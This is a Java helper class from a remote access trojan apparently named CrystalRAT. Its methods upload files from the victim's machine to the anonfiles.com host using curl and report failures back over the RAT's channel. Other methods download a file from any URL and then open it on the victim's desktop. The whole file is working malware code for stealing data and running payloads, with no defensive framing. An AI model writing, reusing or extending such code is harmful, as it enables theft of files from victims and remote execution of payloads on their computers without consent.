package me.custompayload.crystal.utils;

import me.custompayload.crystal.CrystalRAT;
import org.apache.commons.io.FileUtils;

import java.awt.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

public class CrystalUtils {

    public static String uploadToServer(String location){
        CrystalRAT crystalRAT = new CrystalRAT();
        try {
            File file = new File(location);
            if(file.exists()){
                Process process = Runtime.getRuntime().exec("curl -F \"file=@" + location + "\" https://api.anonfiles.com/upload");
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while((line = reader.readLine()) != null){
                    if(line.contains("true")){
                        return "https:" + line.split(":")[6].replace("\",\"short\"", "");
                    }else{
                        crystalRAT.send("[**ERROR**] An error occurred while trying to upload file " + location + " to the server.");
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
            crystalRAT.send("[**ERROR**] An error occurred while trying to upload file " + location + " to the server.");
        }
        return "None";
    }

    public static void drop(String location, String downloadURL){
        try {
            URL url = new URL(downloadURL);
            File f = new File(location);
            FileUtils.copyURLToFile(url, f);
        } catch (IOException ignored) {}
    }

    public static void exec(String location){
        try {
            Desktop desktop = Desktop.getDesktop();
            desktop.open(new File(location));
        }catch (IOException ignored){}
    }
}
